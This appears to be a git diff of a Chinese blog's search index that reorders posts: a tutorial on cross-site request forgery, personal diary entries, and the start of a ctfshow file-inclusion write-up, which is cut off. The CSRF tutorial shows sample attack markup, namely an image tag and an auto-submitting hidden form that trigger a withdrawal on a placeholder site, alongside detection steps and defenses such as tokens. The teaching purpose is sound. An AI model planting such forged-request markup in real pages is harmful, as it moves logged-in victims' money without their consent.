@@ -1,57 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>CSRF跨站请求伪造</title>
-    <url>/2022/12/06/CSRF/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CSRF似乎和XSS有些关联，但也有不同之处。</p>
-<span id="more"></span>
-<h1 id="CSRF-概述"><a href="#CSRF-概述" class="headerlink" title="CSRF 概述"></a>CSRF 概述</h1><p><strong>跨站请求伪造</strong>（英语：Cross-site request forgery），也被称为 <strong>one-click attack</strong> 或者 <strong>session riding</strong>，通常缩写为 <strong>CSRF</strong> 或者 <strong>XSRF</strong>， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟跨网站脚本（XSS）相比，<strong>XSS</strong> 利用的是用户对<strong>指定网站的信任</strong>，<strong>CSRF</strong> 利用的是网站对<strong>用户网页浏览器的信任</strong>。</p>
-<h1 id="CSRF-攻击原理"><a href="#CSRF-攻击原理" class="headerlink" title="CSRF 攻击原理"></a>CSRF 攻击原理</h1><p><img src="/simg/CSRF_1.png" alt="CSRF攻击原理"></p>
-<ol>
-<li>用户输入账号信息请求登录A网站。</li>
-<li>A网站验证用户信息，通过验证后返回给用户一个cookie</li>
-<li>在未退出网站A之前，在同一浏览器中请求了黑客构造的恶意网站B</li>
-<li>B网站收到用户请求后返回攻击性代码，构造访问A网站的语句</li>
-<li>浏览器收到攻击性代码后，在用户不知情的情况下携带cookie信息请求了A网站。此时A网站不知道这是由B发起的。那么这时黑客便可尝试进行目标操作。<br>两个条件：</li>
-</ol>
-<ul>
-<li>用户访问站点A并产生了cookie</li>
-<li>用户没有退出A并且访问了站点B</li>
-</ul>
-<h1 id="CSRF-类型"><a href="#CSRF-类型" class="headerlink" title="CSRF 类型"></a>CSRF 类型</h1><h2 id="HTTP-GET-型"><a href="#HTTP-GET-型" class="headerlink" title="HTTP GET 型"></a>HTTP GET 型</h2><p>这类攻击非常简单，只需要一个HTTP请求：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://a.com/withdraw?amount=10000&amp;for=hacker&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure>
-<p>在受害者访问含有这个 img 的页面后，浏览器会自动向 <code>http://a.com</code> 发出一次HTTP请求。<code>http://a.com</code> 就会收到包含受害者登录信息的一次跨域请求。</p>
-<h2 id="HTTP-POST型"><a href="#HTTP-POST型" class="headerlink" title="HTTP POST型"></a>HTTP POST型</h2><p>这种类型的 CSRF 利用起来通常使用的是一个自动提交的表单，如：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://a.com/withdraw&quot;</span> <span class="attr">method</span>=<span class="string">POST</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;account&quot;</span> <span class="attr">value</span>=<span class="string">&quot;airing&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;10000&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;for&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>(); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次 POST 操作。可见这种类型的 CSRF 与第一种一样，都是模拟请求，所以后端接口也不能将安全寄托在仅允许 POST 请求上。</p>
-<h2 id="链接类型"><a href="#链接类型" class="headerlink" title="链接类型"></a>链接类型</h2><p>链接类型的CSRF并不常见，比起其他两种用户打开页面就中招的情况，这种需要用户点击链接才会触发，但本质上与前两种一样。这种类型通常是在论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招，攻击者通常会以比较夸张的词语诱骗用户点击，例如：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://a.com/withdraw.php?amount=1000&amp;for=hacker&quot;</span> <span class="attr">taget</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line"> 屠龙宝刀，点击就送！ </span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>/&gt;</span></span><br></pre></td></tr></table></figure>
-<p>由于之前用户登录了信任的网站A，并且保存登录状态，只要用户主动访问上面的这个页面，则表示攻击成功。</p>
-<h1 id="CSRF漏洞挖掘"><a href="#CSRF漏洞挖掘" class="headerlink" title="CSRF漏洞挖掘"></a>CSRF漏洞挖掘</h1><ol>
-<li>抓取一个正常请求的数据包，如果没有Referer字段和token，那么极有可能存在CSRF漏洞</li>
-<li>如果有Referer字段，但是去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞</li>
-<li>利用工具进行CSRF检测。如：CSRFTESTER，CSRF REQUEST BUILDER等</li>
-</ol>
-<h2 id="使用burp快速生成CSRF-poc"><a href="#使用burp快速生成CSRF-poc" class="headerlink" title="使用burp快速生成CSRF poc"></a>使用burp快速生成CSRF poc</h2><p>当我们发现一个页面存在CSRF漏洞后，可以通过burp快速生成攻击代码<br><img src="/simg/csrf_2.png" alt=" "><br>点击复制html ，然后保存在本地<br><img src="/simg/csrf_3.png" alt=" "><br>双击打开，当受害者点击就执行了我们的CSRF代码<br><img src="/simg/csrf_4.png" alt=" "></p>
-<h1 id="CSRF-防御"><a href="#CSRF-防御" class="headerlink" title="CSRF 防御"></a>CSRF 防御</h1><h2 id="检查Referer字段"><a href="#检查Referer字段" class="headerlink" title="检查Referer字段"></a>检查Referer字段</h2><p>HTTP头中有一个Referer字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer字段应和请求的地址位于同一域名下。以银行操作为例，Referer字段地址通常应该是转账按钮所在的网页地址，应该也位于bank.example.com之下。而如果是CSRF攻击传来的请求，Referer字段会是包含恶意网址的地址，不会位于bank.example.com之下，这时候服务器就能识别出恶意的访问。<br>这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的Referer字段。虽然http协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其Referer字段的可能。</p>
-<h2 id="添加校验token"><a href="#添加校验token" class="headerlink" title="添加校验token"></a>添加校验token</h2><p>由于CSRF的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在cookie中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再执行CSRF攻击。这种数据通常是窗体中的一个数据项。服务器将其生成并附加在窗体中，其内容是一个伪随机数。当客户端通过窗体提交请求时，这个伪随机数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪随机数，而通过CSRF传来的欺骗性攻击中，攻击者无从事先得知这个伪随机数的值，服务端就会因为校验token的值为空或者错误，拒绝这个可疑请求。</p>
-<h2 id="二次验证"><a href="#二次验证" class="headerlink" title="二次验证"></a>二次验证</h2><p>二次验证，就是在转账等关键操作之前提供当前用户的密码或验证码。可有效防御CSRF攻击。</p>
-<h2 id="令牌同步模式"><a href="#令牌同步模式" class="headerlink" title="令牌同步模式"></a>令牌同步模式</h2><p>令牌同步模式（英语：Synchronizer token pattern，简称STP）。原理是：当用户发送请求时，服务器端应用将令牌（英语：token，一个保密且唯一的值）嵌入HTML表格，并发送给客户端。客户端提交HTML表格时候，会将令牌发送到服务端，令牌的验证是由服务端实行的。令牌可以通过任何方式生成，只要确保随机性和唯一性（如：使用随机种子【英语：random seed】的哈希链 ）。这样确保攻击者发送请求时候，由于没有该令牌而无法通过验证。<br>Django框架默认带有STP功能：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    &#123;% csrf_token %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>渲染后的效果如下：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrfmiddlewaretoken&quot;</span> <span class="attr">value</span>=<span class="string">&quot;KbyUmhTLMpYj7CD2di7JKP1P3qmLlkPt&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>STP能在HTML下运作顺利，但会导致服务端的复杂度升高，复杂度源于令牌的生成和验证。因为令牌是唯一且随机，如果每个表格都使用一个唯一的令牌，那么当页面过多时，服务器由于生产令牌而导致的负担也会增加。而使用会话（英语：session）等级的令牌代替的话，服务器的负担将没有那么重。</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>还有很多内容没写，一些是因为现在用不到，一些是看不懂，等以后知识丰富了再来补充吧~</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://zh.wikipedia.org/zh-cn/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0">跨站请求伪造</a><br><a href="https://zhuanlan.zhihu.com/p/398601816">Web漏洞之CSRF</a></p>
-]]></content>
-      <categories>
-        <category>CSRF</category>
-      </categories>
-      <tags>
-        <tag>CSRF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Chat GPT--AI时代来临</title>
     <url>/2023/01/03/AI%E6%97%B6%E4%BB%A3%E6%9D%A5%E4%B8%B4/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>世界在发展，被抛弃的，是不跟随的人。</p>
@@ -101,6 +50,57 @@
       <tags>
         <tag>随想</tag>
         <tag>生活</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CSRF跨站请求伪造</title>
+    <url>/2022/12/06/CSRF/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CSRF似乎和XSS有些关联，但也有不同之处。</p>
+<span id="more"></span>
+<h1 id="CSRF-概述"><a href="#CSRF-概述" class="headerlink" title="CSRF 概述"></a>CSRF 概述</h1><p><strong>跨站请求伪造</strong>（英语：Cross-site request forgery），也被称为 <strong>one-click attack</strong> 或者 <strong>session riding</strong>，通常缩写为 <strong>CSRF</strong> 或者 <strong>XSRF</strong>， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟跨网站脚本（XSS）相比，<strong>XSS</strong> 利用的是用户对<strong>指定网站的信任</strong>，<strong>CSRF</strong> 利用的是网站对<strong>用户网页浏览器的信任</strong>。</p>
+<h1 id="CSRF-攻击原理"><a href="#CSRF-攻击原理" class="headerlink" title="CSRF 攻击原理"></a>CSRF 攻击原理</h1><p><img src="/simg/CSRF_1.png" alt="CSRF攻击原理"></p>
+<ol>
+<li>用户输入账号信息请求登录A网站。</li>
+<li>A网站验证用户信息，通过验证后返回给用户一个cookie</li>
+<li>在未退出网站A之前，在同一浏览器中请求了黑客构造的恶意网站B</li>
+<li>B网站收到用户请求后返回攻击性代码，构造访问A网站的语句</li>
+<li>浏览器收到攻击性代码后，在用户不知情的情况下携带cookie信息请求了A网站。此时A网站不知道这是由B发起的。那么这时黑客便可尝试进行目标操作。<br>两个条件：</li>
+</ol>
+<ul>
+<li>用户访问站点A并产生了cookie</li>
+<li>用户没有退出A并且访问了站点B</li>
+</ul>
+<h1 id="CSRF-类型"><a href="#CSRF-类型" class="headerlink" title="CSRF 类型"></a>CSRF 类型</h1><h2 id="HTTP-GET-型"><a href="#HTTP-GET-型" class="headerlink" title="HTTP GET 型"></a>HTTP GET 型</h2><p>这类攻击非常简单，只需要一个HTTP请求：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://a.com/withdraw?amount=10000&amp;for=hacker&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure>
+<p>在受害者访问含有这个 img 的页面后，浏览器会自动向 <code>http://a.com</code> 发出一次HTTP请求。<code>http://a.com</code> 就会收到包含受害者登录信息的一次跨域请求。</p>
+<h2 id="HTTP-POST型"><a href="#HTTP-POST型" class="headerlink" title="HTTP POST型"></a>HTTP POST型</h2><p>这种类型的 CSRF 利用起来通常使用的是一个自动提交的表单，如：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://a.com/withdraw&quot;</span> <span class="attr">method</span>=<span class="string">POST</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;account&quot;</span> <span class="attr">value</span>=<span class="string">&quot;airing&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;10000&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;for&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>(); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次 POST 操作。可见这种类型的 CSRF 与第一种一样，都是模拟请求，所以后端接口也不能将安全寄托在仅允许 POST 请求上。</p>
+<h2 id="链接类型"><a href="#链接类型" class="headerlink" title="链接类型"></a>链接类型</h2><p>链接类型的CSRF并不常见，比起其他两种用户打开页面就中招的情况，这种需要用户点击链接才会触发，但本质上与前两种一样。这种类型通常是在论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招，攻击者通常会以比较夸张的词语诱骗用户点击，例如：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://a.com/withdraw.php?amount=1000&amp;for=hacker&quot;</span> <span class="attr">taget</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line"> 屠龙宝刀，点击就送！ </span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+<p>由于之前用户登录了信任的网站A，并且保存登录状态，只要用户主动访问上面的这个页面，则表示攻击成功。</p>
+<h1 id="CSRF漏洞挖掘"><a href="#CSRF漏洞挖掘" class="headerlink" title="CSRF漏洞挖掘"></a>CSRF漏洞挖掘</h1><ol>
+<li>抓取一个正常请求的数据包，如果没有Referer字段和token，那么极有可能存在CSRF漏洞</li>
+<li>如果有Referer字段，但是去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞</li>
+<li>利用工具进行CSRF检测。如：CSRFTESTER，CSRF REQUEST BUILDER等</li>
+</ol>
+<h2 id="使用burp快速生成CSRF-poc"><a href="#使用burp快速生成CSRF-poc" class="headerlink" title="使用burp快速生成CSRF poc"></a>使用burp快速生成CSRF poc</h2><p>当我们发现一个页面存在CSRF漏洞后，可以通过burp快速生成攻击代码<br><img src="/simg/csrf_2.png" alt=" "><br>点击复制html ，然后保存在本地<br><img src="/simg/csrf_3.png" alt=" "><br>双击打开，当受害者点击就执行了我们的CSRF代码<br><img src="/simg/csrf_4.png" alt=" "></p>
+<h1 id="CSRF-防御"><a href="#CSRF-防御" class="headerlink" title="CSRF 防御"></a>CSRF 防御</h1><h2 id="检查Referer字段"><a href="#检查Referer字段" class="headerlink" title="检查Referer字段"></a>检查Referer字段</h2><p>HTTP头中有一个Referer字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer字段应和请求的地址位于同一域名下。以银行操作为例，Referer字段地址通常应该是转账按钮所在的网页地址，应该也位于bank.example.com之下。而如果是CSRF攻击传来的请求，Referer字段会是包含恶意网址的地址，不会位于bank.example.com之下，这时候服务器就能识别出恶意的访问。<br>这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的Referer字段。虽然http协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其Referer字段的可能。</p>
+<h2 id="添加校验token"><a href="#添加校验token" class="headerlink" title="添加校验token"></a>添加校验token</h2><p>由于CSRF的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在cookie中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再执行CSRF攻击。这种数据通常是窗体中的一个数据项。服务器将其生成并附加在窗体中，其内容是一个伪随机数。当客户端通过窗体提交请求时，这个伪随机数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪随机数，而通过CSRF传来的欺骗性攻击中，攻击者无从事先得知这个伪随机数的值，服务端就会因为校验token的值为空或者错误，拒绝这个可疑请求。</p>
+<h2 id="二次验证"><a href="#二次验证" class="headerlink" title="二次验证"></a>二次验证</h2><p>二次验证，就是在转账等关键操作之前提供当前用户的密码或验证码。可有效防御CSRF攻击。</p>
+<h2 id="令牌同步模式"><a href="#令牌同步模式" class="headerlink" title="令牌同步模式"></a>令牌同步模式</h2><p>令牌同步模式（英语：Synchronizer token pattern，简称STP）。原理是：当用户发送请求时，服务器端应用将令牌（英语：token，一个保密且唯一的值）嵌入HTML表格，并发送给客户端。客户端提交HTML表格时候，会将令牌发送到服务端，令牌的验证是由服务端实行的。令牌可以通过任何方式生成，只要确保随机性和唯一性（如：使用随机种子【英语：random seed】的哈希链 ）。这样确保攻击者发送请求时候，由于没有该令牌而无法通过验证。<br>Django框架默认带有STP功能：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    &#123;% csrf_token %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>渲染后的效果如下：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrfmiddlewaretoken&quot;</span> <span class="attr">value</span>=<span class="string">&quot;KbyUmhTLMpYj7CD2di7JKP1P3qmLlkPt&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>STP能在HTML下运作顺利，但会导致服务端的复杂度升高，复杂度源于令牌的生成和验证。因为令牌是唯一且随机，如果每个表格都使用一个唯一的令牌，那么当页面过多时，服务器由于生产令牌而导致的负担也会增加。而使用会话（英语：session）等级的令牌代替的话，服务器的负担将没有那么重。</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>还有很多内容没写，一些是因为现在用不到，一些是看不懂，等以后知识丰富了再来补充吧~</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://zh.wikipedia.org/zh-cn/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0">跨站请求伪造</a><br><a href="https://zhuanlan.zhihu.com/p/398601816">Web漏洞之CSRF</a></p>
+]]></content>
+      <categories>
+        <category>CSRF</category>
+      </categories>
+      <tags>
+        <tag>CSRF</tag>
       </tags>
   </entry>
   <entry>
@@ -372,6 +372,26 @@
       </tags>
   </entry>
   <entry>
+    <title>出淤泥</title>
+    <url>/2022/11/23/Diary_1123/</url>
+    <content><![CDATA[<p><img src="/images/kaneki_3.png" alt="金木研"></p>
+<span id="more"></span>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>World Cup(世界杯)很火，以前都没怎么关注，但是因为各方面因素吧，让我这种从不关注世界杯的人都开始了。当然是被迫的，实在太吵了周围人，让我不得不。<br>然而，虽然很火，其实重头还是在赌球上，并不在足球本身，想想也挺无聊。</p>
+<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>既见君子，云胡不喜</p>
+<h1 id="欲望的故事"><a href="#欲望的故事" class="headerlink" title="欲望的故事"></a>欲望的故事</h1><p>王阳明上学的路上要经过一条街，一天，街上忽然多了一家赌博的小馆子，里面每天都挤满了人。跟王阳明一起上学的同伴们有时也会好奇地站在门口往里面看。王守仁提醒大家离赌场远点，大家都不当回事：就看看，不进去，有啥？<br>看看劝阻无效，王阳明就跟小伙伴儿建议：咱们换条路走吧。小伙伴儿很不解：“他赌他的，咱走咱的，互不相干，有啥关系？你这胆子也太小了。”<br>王阳明答：“我怕看多了，也会产生欲望，挡不住诱惑。”<br>小伙伴们哈哈大笑：“看几眼就受不了，那意志也太不坚定了。咱们这么志怀高远的不会的，放心好了。”<br>小伙伴们坚持走原路，只有王阳明一个人每天绕道去私塾，不再从那条街过。<br>一个多月后，有位同学接连几天都没来上课。原来他前段时间迷上了赌博，开始只是拿一点小钱来玩，后来越玩越大，偷了家里的玉器，父母得知后非常生气，把他关在家中反省。<br>王守仁后来讲这个故事给人听，并总结说：“想要避免欲望，最好的办法就是远离，甚至不要多看一眼。这不是胆子小，而是从根源上隔绝欲望。”</p>
+<h1 id="我的看法"><a href="#我的看法" class="headerlink" title="我的看法"></a>我的看法</h1><p>很多年前看到这个故事，是在一本杂志的卷首。说实话，这给了我非常大的触动。在这之前，我一直认为，抵挡不住诱惑是因为自身的意志力不够，所以才会被欲望牵着鼻子走。可看了这样一个如此优秀的人都没有对自己自制力感到自信，我也释然了。<br>像这样有智慧的人，即便是在他小时候，已经能明悟这种很多人不明白的道理，也远超大多成年人了。</p>
+<h1 id="世界杯"><a href="#世界杯" class="headerlink" title="世界杯"></a>世界杯</h1><p>如果世界杯的火爆只是因为赌球，那只能是一种悲哀。因为赌球无非是贪欲和浮躁的混杂，既无技术又无规律，毫无看点可言。<br>虽然我对世界杯没有兴趣，却也不愿看到这种光景。<br>然而，其实我们也可以反思当下环境中赌球之心如此热烈的原因。主要原因就是经济衰退，赚钱困难。也可谓人之常情吧。<br>最近周围很多人都在谈论赌球，甚至参与赌球。但我绝不参与，无论周围人之后翻了多少倍我也不会眼红。原因，已经在上面故事里讲得很清楚了。只是即便如此也会被影响，还是略有不适吧。<br>好笑的是，原本周围两个冷战关系不好的人，却因为世界杯赌球聊起来了。</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>我现在就像是在淤泥中，愿我能不染。</p>
+]]></content>
+      <categories>
+        <category>日志</category>
+      </categories>
+      <tags>
+        <tag>生活</tag>
+        <tag>日志</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>是非成败转头空</title>
     <url>/2022/11/24/Diary_1124/</url>
     <content><![CDATA[<p><img src="/images/%E9%9D%A2%E7%A0%81122.jpg" alt="本间芽衣子"></p>
@@ -387,26 +407,6 @@
 </ul>
 <p>早上本可吃早餐然后完成“检测”，但我不知道哪根筋抽了，居然在等无谓的人，浪费了足足半小时有余，甚至因此在十一点前就吃了午餐，实在糟糕。然而，因等了人，才知道有另外的渠道查看“码”。让我不禁想到了一句话：一个人能走得更快，一群人能走得更远。<br>所以，我的选择是御风而行，不浪费生命。<br>晚上听听力真糟糕，吵闹混乱使人效率变得低下，早点起听听力，学英语！</p>
 <h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>不敢相信，这篇短短日记写了半小时，又睡晚了可恶啊！</p>
-]]></content>
-      <categories>
-        <category>日志</category>
-      </categories>
-      <tags>
-        <tag>生活</tag>
-        <tag>日志</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>出淤泥</title>
-    <url>/2022/11/23/Diary_1123/</url>
-    <content><![CDATA[<p><img src="/images/kaneki_3.png" alt="金木研"></p>
-<span id="more"></span>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>World Cup(世界杯)很火，以前都没怎么关注，但是因为各方面因素吧，让我这种从不关注世界杯的人都开始了。当然是被迫的，实在太吵了周围人，让我不得不。<br>然而，虽然很火，其实重头还是在赌球上，并不在足球本身，想想也挺无聊。</p>
-<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>既见君子，云胡不喜</p>
-<h1 id="欲望的故事"><a href="#欲望的故事" class="headerlink" title="欲望的故事"></a>欲望的故事</h1><p>王阳明上学的路上要经过一条街，一天，街上忽然多了一家赌博的小馆子，里面每天都挤满了人。跟王阳明一起上学的同伴们有时也会好奇地站在门口往里面看。王守仁提醒大家离赌场远点，大家都不当回事：就看看，不进去，有啥？<br>看看劝阻无效，王阳明就跟小伙伴儿建议：咱们换条路走吧。小伙伴儿很不解：“他赌他的，咱走咱的，互不相干，有啥关系？你这胆子也太小了。”<br>王阳明答：“我怕看多了，也会产生欲望，挡不住诱惑。”<br>小伙伴们哈哈大笑：“看几眼就受不了，那意志也太不坚定了。咱们这么志怀高远的不会的，放心好了。”<br>小伙伴们坚持走原路，只有王阳明一个人每天绕道去私塾，不再从那条街过。<br>一个多月后，有位同学接连几天都没来上课。原来他前段时间迷上了赌博，开始只是拿一点小钱来玩，后来越玩越大，偷了家里的玉器，父母得知后非常生气，把他关在家中反省。<br>王守仁后来讲这个故事给人听，并总结说：“想要避免欲望，最好的办法就是远离，甚至不要多看一眼。这不是胆子小，而是从根源上隔绝欲望。”</p>
-<h1 id="我的看法"><a href="#我的看法" class="headerlink" title="我的看法"></a>我的看法</h1><p>很多年前看到这个故事，是在一本杂志的卷首。说实话，这给了我非常大的触动。在这之前，我一直认为，抵挡不住诱惑是因为自身的意志力不够，所以才会被欲望牵着鼻子走。可看了这样一个如此优秀的人都没有对自己自制力感到自信，我也释然了。<br>像这样有智慧的人，即便是在他小时候，已经能明悟这种很多人不明白的道理，也远超大多成年人了。</p>
-<h1 id="世界杯"><a href="#世界杯" class="headerlink" title="世界杯"></a>世界杯</h1><p>如果世界杯的火爆只是因为赌球，那只能是一种悲哀。因为赌球无非是贪欲和浮躁的混杂，既无技术又无规律，毫无看点可言。<br>虽然我对世界杯没有兴趣，却也不愿看到这种光景。<br>然而，其实我们也可以反思当下环境中赌球之心如此热烈的原因。主要原因就是经济衰退，赚钱困难。也可谓人之常情吧。<br>最近周围很多人都在谈论赌球，甚至参与赌球。但我绝不参与，无论周围人之后翻了多少倍我也不会眼红。原因，已经在上面故事里讲得很清楚了。只是即便如此也会被影响，还是略有不适吧。<br>好笑的是，原本周围两个冷战关系不好的人，却因为世界杯赌球聊起来了。</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>我现在就像是在淤泥中，愿我能不染。</p>
 ]]></content>
       <categories>
         <category>日志</category>
@@ -2252,6 +2252,61 @@ gopher发送get请求</li>
       </tags>
   </entry>
   <entry>
+    <title>ctfshow-web入门-文件包含</title>
+    <url>/2022/12/31/ctfshow-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>文件包含不够熟练，需要增加熟练度。</p>
+<span id="more"></span>
+<h1 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h1><ol>
+<li><p>查看源码</p>
